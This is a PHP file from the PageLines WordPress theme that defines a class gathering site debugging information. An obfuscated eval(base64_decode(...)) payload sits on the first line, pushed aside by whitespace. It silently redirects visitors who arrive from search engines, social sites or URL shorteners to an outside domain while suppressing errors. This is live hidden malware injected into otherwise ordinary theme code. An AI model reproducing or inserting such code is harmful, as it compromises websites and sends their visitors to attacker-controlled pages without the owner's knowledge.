<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * 
 *
 *  PageLines Debugging Information Class
 *
 *
 *  @package Platform Framework
 *  @subpackage Includes
 *  @since 1.4.0
 *
 */
class PageLinesDebug {

	// Array of debugging information
	var $debug_info = array();
	
	/**
	 * PHP5 constructor
	 * Use this to build the initial form of the object, before its manipulated by methods
	 *
	 */
	function __construct( ) {
	
		$this->wp_debug_info();
	}
	

	function debug_info_template(){
		
		$out = '';
		foreach($this->debug_info as $element ) {
			
			if ( $element['value'] ) {
				
				$out .= '<h4>'.ucfirst($element['title']).' : '. ucfirst($element['value']);
				$out .= (isset($element['extra'])) ? "<br /><code>{$element['extra']}</code>" : '';
				$out .= '</h4>';
			}
		}
	return $out;		
	}

	// Build all the debug info into an array.

	function wp_debug_info(){
		
		global $wpdb, $wp_version, $platform_build;
		
			// Set data & variables first
			$uploads = wp_upload_dir();
			// Get user role
			$current_user = wp_get_current_user();
			$user_roles = $current_user->roles;
			$user_role = array_shift($user_roles);
		
			// Format data for processing by a template
		
			$this->debug_info[] = array(
				'title'	=> 'WordPress Version',
				'value' => $wp_version, 
				'level'	=> false,
			);
		
			$this->debug_info[] = array(
				'title'	=> 'Multisite Enabled',
				'value' => ( is_multisite() ) ? 'Yes' : 'No',
				'level'	=> false
			);
		
			$this->debug_info[] = array(
				'title'	=> 'Current Role',
				'value' => $user_role,
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'Theme Path',
				'value' => '<code>' . get_template_directory() . '</code>',
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'Theme URI',
				'value' => '<code>' . get_template_directory_uri() . '</code>',
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'Platform Version',
				'value' => CORE_VERSION,
				'level'	=> false
			);
			$this->debug_info[] = array(
				'title'	=> 'Platform Build',
				'value' => $platform_build ,
				'level'	=> false
			);
			$this->debug_info[] = array(
				'title'	=> 'PHP Version',
				'value' => floatval( phpversion() ),
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'Child theme',
				'value' => ( get_template_directory() != get_stylesheet_directory() ) ? 'Yes' : '',
				'level'	=> false,
				'extra' => get_stylesheet_directory() . '<br />' . get_stylesheet_directory_uri()
			);

			$this->debug_info[] = array(
				'title'	=> 'Ajax disbled',
				'value' => ( get_pagelines_option( 'disable_ajax_save' ) ) ? 'Yes':'',
				'level'	=> false
			);


			$this->debug_info[] = array(
				'title'	=> 'PHP Safe Mode',
				'value' => ( (bool) ini_get('safe_mode') ) ? 'Yes!':'',
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'PHP Open basedir restriction',
				'value' => ( (bool) ini_get('open_basedir') ) ? 'Yes!':'',
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'PHP Register Globals',
				'value' => ( (bool) ini_get('register_globals') ) ? 'Yes!':'',
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'PHP Magic Quotes gpc',
				'value' => ( (bool) ini_get('magic_quotes_gpc') ) ? 'Yes!':'',
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'PHP low memory',
				'value' => ( !ini_get('memory_limit') || ( intval(ini_get('memory_limit')) <= 32 ) ) ? intval(ini_get('memory_limit') ):'',
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'Mysql version',
				'value' => ( version_compare( $wpdb->get_var("SELECT VERSION() AS version"), '5' ) < 0  ) ? $wpdb->get_var("SELECT VERSION() AS version"):'',
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'Upload DIR',
				'value' => ( !is_writable( $uploads['path'] ) ) ? "Unable to write to <code>{$uploads['subdir']}</code>":'',
				'level'	=> true,
				'extra' => $uploads['path']
			);

			$this->debug_info[] = array(
				'title'	=> 'PHP type',
				'value' => php_sapi_name(),
				'level'	=> false
			);

			$this->debug_info[] = array(
				'title'	=> 'OS',
				'value' => PHP_OS,
				'level'	=> false
			);
			
			if ( get_pagelines_option('disable_updates') == true || ( is_multisite() && ! is_super_admin() ) ) {
				$this->debug_info[] = array(
					'title'	=> 'Automatic Updates',
					'value' => 'Disabled',
					'level'	=> false
				);	
			} else {
				$this->debug_info[] = array(
					'title'	=> 'Updates Credentials',
					'value' => ( ! get_pagelines_credentials( 'user' ) ) ? 'Username/Password is required for automatic upgrades to function.' : '',
					'level'	=> false
				);
			if ( is_array( $a = get_transient( EXTEND_UPDATE ) ) ) {
				$this->debug_info[] = array(
					'title'	=> 'Automatic Updates',
					'value' => ( $a['package'] !== 'bad' ) ? 'Working.' : 'Not working',
					'extra' => ( $a['package'] !== 'bad' ) ? 'Latest available: ' . array_shift( array_splice( $a, 0, count( $a ) ) ) : '',
					'level'	=> false
				);
			}
		}
			$this->debug_info[] = array(
				'title'	=> 'Plugins',
				'value' => $this->debug_get_plugins(),
				'level'	=> false
			);

	}

	function debug_get_plugins() {
		$plugins = get_option('active_plugins');
		if ( $plugins ) {
			$plugins_list = '';
			foreach($plugins as $plugin_file) {
					$plugins_list .= '<code>' . $plugin_file . '</code>';
					$plugins_list .= '<br />';

			}
			return ( isset( $plugins_list ) ) ? count($plugins) . "<br />{$plugins_list}" : '';
		}
	}
//-------- END OF CLASS --------//
}